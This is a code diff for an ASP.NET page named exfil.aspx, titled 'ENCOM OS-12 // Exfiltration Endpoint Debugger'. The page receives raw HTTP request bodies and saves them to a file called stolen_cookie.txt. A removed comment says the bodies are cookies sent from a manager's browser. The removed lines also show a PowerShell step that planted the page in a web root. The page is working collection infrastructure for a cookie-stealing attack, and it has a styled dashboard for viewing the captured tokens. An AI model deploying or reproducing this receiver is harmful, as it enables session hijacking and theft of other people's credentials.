@@ -1,27 +1,78 @@
-$ReceiverCode = @'
 <%@ Page Language="C#" Debug="true" %>
 <%@ Import Namespace="System.IO" %>
 <script runat="server">
+    public string GlobalDebugStatus = "Awaiting inbound HTTP request packets...";
+    public string SystemErrorMessage = "None";
+    public string TargetFilePath = @"C:\inetpub\logs\stolen_cookie.txt";
+    public string IncomingPayloadSample = "None Received Yet";
+
     void Page_Load(object sender, EventArgs e) {
         try {
-            string webRoot = Server.MapPath("~");
-            string targetFile = Path.Combine(webRoot, "stolen_cookie.txt");
-            
-            // Read the raw HTTP request body bytes sent by the manager's browser
+            // 1. Verify basic parent directory visibility constraints
+            string parentDir = Path.GetDirectoryName(TargetFilePath);
+            if (!Directory.Exists(parentDir)) {
+                GlobalDebugStatus = "FAILURE: The physical target parent directory does not exist on this machine!";
+                return;
+            }
+
+            // 2. Read inbound stream data packets
             using (StreamReader reader = new StreamReader(Request.InputStream)) {
                 string payload = reader.ReadToEnd();
                 if (!string.IsNullOrEmpty(payload)) {
-                    // Forcefully write and overwrite the file on the local disk drive
-                    File.WriteAllText(targetFile, payload);
-                    Response.Write("SUCCESS");
+                    IncomingPayloadSample = payload.Length > 50 ? payload.Substring(0, 50) + "..." : payload;
+                    
+                    // 3. Attempt direct kernel write operation
+                    File.WriteAllText(TargetFilePath, payload);
+                    GlobalDebugStatus = "SUCCESS: Token data has been written to the logs directory cleanly!";
                 } else {
-                    Response.Write("EMPTY_PAYLOAD");
+                    GlobalDebugStatus = "WARNING: Received a hit, but the incoming request payload body was completely empty.";
                 }
             }
+        } catch (UnauthorizedAccessException unauthEx) {
+            GlobalDebugStatus = "CRITICAL FILE SYSTEM ACCESS DENIED ERROR";
+            SystemErrorMessage = "The web app worker identity lacks Windows security permissions to write inside this directory: " + unauthEx.Message;
         } catch (Exception ex) {
-            Response.Write("ERROR: " + ex.Message);
+            GlobalDebugStatus = "UNHANDLED ASP.NET SYSTEM EXCEPTION";
+            SystemErrorMessage = ex.GetType().ToString() + " -> " + ex.Message;
         }
     }
 </script>
-'@
-Set-Content -Path "$WebRoot\exfil.aspx" -Value $ReceiverCode -Force
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ENCOM OS-12 // Exfiltration Endpoint Debugger</title>
+    <style>
+        body { background-color: #020208; color: #ff0055; font-family: 'Courier New', monospace; padding: 30px; }
+        .dashboard { max-width: 750px; border: 2px solid #ff0055; padding: 25px; background: rgba(15, 3, 8, 0.9); box-shadow: 0 0 15px rgba(255, 0, 85, 0.2); }
+        h1 { color: #fff; border-bottom: 1px dashed #ff0055; padding-bottom: 10px; font-size: 20px; text-transform: uppercase; margin-top: 0; }
+        .metric { margin-bottom: 15px; font-size: 14px; }
+        .label { color: #00f2fe; font-weight: bold; }
+        .value-box { background: #000; border: 1px solid #4facfe; color: #39ff14; padding: 10px; margin-top: 5px; font-size: 12px; overflow-x: auto; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+<div class="dashboard">
+    <h1>Grid Exfiltration Diagnostic Endpoint</h1>
+    
+    <div class="metric">
+        <span class="label">> PIPELINE RUN STATUS:</span>
+        <div class="value-box" style="color: #fff;"><%= GlobalDebugStatus %></div>
+    </div>
+
+    <div class="metric">
+        <span class="label">> FORCED SYSTEM TARGET PATH:</span>
+        <div class="value-box" style="color: #4facfe;"><%= TargetFilePath %></div>
+    </div>
+
+    <div class="metric">
+        <span class="label">> WINDOWS SYSTEM ERROR DETAILS:</span>
+        <div class="value-box" style="color: #ff0055;"><%= SystemErrorMessage %></div>
+    </div>
+
+    <div class="metric">
+        <span class="label">> RECENT DATA PACKET STREAM SAMPLE:</span>
+        <div class="value-box"><%= IncomingPayloadSample %></div>
+    </div>
+</div>
+</body>
+</html>
